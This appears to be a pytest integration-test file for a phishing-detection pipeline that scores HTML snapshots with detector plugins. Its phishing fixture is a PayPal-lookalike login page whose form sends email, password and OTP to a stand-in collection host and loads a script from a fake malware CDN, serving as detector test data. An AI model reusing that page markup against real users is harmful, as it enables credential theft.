"""Integration tests for the VigilWolf v2 full analysis pipeline.

Tests the end-to-end flow: HTML capture -> build SnapshotContext -> run all
registered plugins -> calculate_score -> verify risk classification.

No database is required — these tests exercise the pure pipeline logic only.
"""
import os
import pytest

# Ensure ENABLED_PLUGINS is set before importing worker / registry modules.
os.environ.setdefault(
    "ENABLED_PLUGINS",
    "login_detector,keyword_detector,brand_match,external_js_detector,"
    "nrd_age_scorer,html_hasher",
)

# Import all plugin modules so @register_plugin fires on import.
import plugins.login_detector       # noqa: F401
import plugins.keyword_detector     # noqa: F401
import plugins.brand_match          # noqa: F401
import plugins.external_js_detector # noqa: F401
import plugins.nrd_age_scorer       # noqa: F401
import plugins.html_hasher          # noqa: F401

from worker import build_snapshot_context
from plugins.base import PluginResult
from plugins.registry import PLUGIN_REGISTRY, get_execution_groups, circuit_breaker
from services.scoring_service import calculate_score, DEFAULT_WEIGHTS


# ---------------------------------------------------------------------------
# Helper: run full pipeline (no DB) and return score outcome
# ---------------------------------------------------------------------------

def _run_pipeline(snapshot_id: str, domain: str, html: str,
                 snapshot_record: dict | None = None) -> dict:
    """Build context, run all enabled plugins, score with standard weights.

    Returns the score outcome dict from calculate_score().
    """
    if snapshot_record is None:
        snapshot_record = {"id": snapshot_id, "domain_id": "test-domain"}

    ctx = build_snapshot_context(
        snapshot_id=snapshot_id,
        domain=domain,
        html=html,
        snapshot_record=snapshot_record,
    )

    # Collect all enabled plugin instances, respecting execution groups
    results: list[PluginResult] = []
    execution_groups = get_execution_groups()
    for group in execution_groups:
        for plugin_name, _priority in group.plugins:
            cls = PLUGIN_REGISTRY.get(plugin_name)
            if cls is None:
                continue
            plugin = cls()
            # Circuit breaker — always allow in tests (queue_depth=0)
            if not circuit_breaker.should_run(plugin_name, plugin.plugin_type, queue_depth=0):
                continue
            result = plugin.run(ctx)
            results.append(result)

    # Score with default (standard) weights
    return calculate_score(results, DEFAULT_WEIGHTS)


# ---------------------------------------------------------------------------
# HTML fixtures
# ---------------------------------------------------------------------------

PHISHING_HTML = """\
<!DOCTYPE html>
<html>
<head>
    <title>PayPa1 Securiity - Verify Your Account</title>
    <meta name="description" content="Your account has been suspended. Verify immediately.">
</head>
<body>
    <h1>PayPa1 Securiity Alert</h1>
    <p>Your account has been suspended due to unauthorized access.
       Please verify your identity immediately to avoid permanent suspension.
       Enter your OTP and password below to restore access.</p>
    <form action="https://evil-collect.example.com/steal" method="POST">
        <input type="hidden" name="token" value="abc123xyz">
        <input type="text" name="email" placeholder="Email address">
        <input type="password" name="password" placeholder="Password">
        <input type="text" name="otp" placeholder="Enter OTP">
        <button type="submit">Verify Now</button>
    </form>
    <p>Failure to confirm will result in account expiration.</p>
    <script src="https://malware-cdn.eviltrack.net/loader.js"></script>
    <script>var tracking = true;</script>
</body>
</html>
"""

BENIGN_HTML = """\
<!DOCTYPE html>
<html>
<head>
    <title>Whiskers Daily - A Cat Blog</title>
    <meta name="description" content="Daily stories about cats and their adventures">
</head>
<body>
    <h1>Welcome to Whiskers Daily</h1>
    <p>Today our cat Mochi discovered a new cardboard box. She sat in it for
       three hours straight, occasionally batting at a dangling piece of string.
       Later she napped on the windowsill and watched the birds outside.</p>
    <p>In other news, the local shelter is hosting an adoption event this weekend.
       If you are looking for a feline companion, stop by and meet some wonderful
       rescue cats.</p>
    <img src="/images/mochi-box.jpg" alt="Mochi in a cardboard box">
    <p>Stay tuned for more updates from our furry friends.</p>
    <script src="/js/analytics.js"></script>
</body>
</html>
"""

BRAND_IMPERSONATION_HTML = """\
<!DOCTYPE html>
<html>
<head>
    <title>Account Services</title>
    <meta name="description" content="Online account management portal">
</head>
<body>
    <h1>Welcome to Account Services</h1>
    <p>This is the management portal for your online account.
       Check your balance and recent transactions below.</p>
    <p>We are committed to keeping your information secure and providing
       the best customer experience.</p>
    <p>For questions, contact support at our help center.</p>
    <script src="/js/app.js"></script>
</body>
</html>
"""


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

class TestFullPipelinePhishingDomain:
    """Pipeline integration test for a phishing domain with login form,
    credential exfiltration, brand mention, suspicious keywords, and
    cross-domain scripts."""

    def test_full_pipeline_phishing_domain(self):
        outcome = _run_pipeline(
            snapshot_id="snap-phish-001",
            domain="paypa1-securiity.com",
            html=PHISHING_HTML,
        )

        # --- Risk level and severity ---
        assert outcome["risk_level"] == "high", (
            f"Expected risk_level 'high', got '{outcome['risk_level']}' "
            f"(score={outcome['score']})"
        )
        assert outcome["severity"] == "critical", (
            f"Expected severity 'critical' (hard signal from credential_exfil), "
            f"got '{outcome['severity']}'"
        )

        # --- Score threshold ---
        assert outcome["score"] >= 70, (
            f"Expected score >= 70, got {outcome['score']}"
        )

        # --- Hard signal should be flagged ---
        assert outcome["hard_signal"] is True, (
            "credential_exfil tag should trigger hard_signal=True"
        )

        # --- Dominant signals should include login_detector (highest weight) ---
        assert "login_detector" in outcome["dominant_signals"], (
            f"login_detector should be a dominant signal, got {outcome['dominant_signals']}"
        )

        # --- Plugin breakdown should have entries for detection plugins ---
        breakdown = outcome["plugin_breakdown"]
        assert "login_detector" in breakdown, "login_detector missing from breakdown"
        assert breakdown["login_detector"] > 0, "login_detector should have positive contribution"


class TestFullPipelineBenignDomain:
    """Pipeline integration test for a benign domain (cat blog, no forms,
    no keywords, same-domain scripts)."""

    def test_full_pipeline_benign_domain(self):
        outcome = _run_pipeline(
            snapshot_id="snap-benign-001",
            domain="whiskersdaily.com",
            html=BENIGN_HTML,
        )

        # --- Risk level should be low ---
        assert outcome["risk_level"] == "low", (
            f"Expected risk_level 'low', got '{outcome['risk_level']}' "
            f"(score={outcome['score']})"
        )

        # --- Score should be well below medium threshold ---
        assert outcome["score"] < 40, (
            f"Expected score < 40, got {outcome['score']}"
        )

        # --- No hard signals ---
        assert outcome["hard_signal"] is False, (
            "Benign page should not trigger any hard signals"
        )


class TestFullPipelineBrandImpersonation:
    """Pipeline integration test for brand impersonation — brand name in
    the domain but no login form present."""

    def test_full_pipeline_brand_impersonation(self):
        outcome = _run_pipeline(
            snapshot_id="snap-brand-001",
            domain="paypa1-login.com",
            html=BRAND_IMPERSONATION_HTML,
        )

        # --- Risk level should be at least medium (brand_match detects paypal in domain) ---
        assert outcome["risk_level"] in ("medium", "high"), (
            f"Expected risk_level 'medium' or 'high' (brand_match should detect brand in domain), "
            f"got '{outcome['risk_level']}' (score={outcome['score']})"
        )

        # --- Score should be non-zero (brand_match should contribute) ---
        assert outcome["score"] > 0, (
            f"Expected score > 0 (brand_match should contribute), got {outcome['score']}"
        )

        # --- Plugin breakdown should show brand_match contribution ---
        breakdown = outcome["plugin_breakdown"]
        assert "brand_match" in breakdown, "brand_match missing from breakdown"
        assert breakdown["brand_match"] > 0, (
            "brand_match should have a positive score contribution when brand is in domain"
        )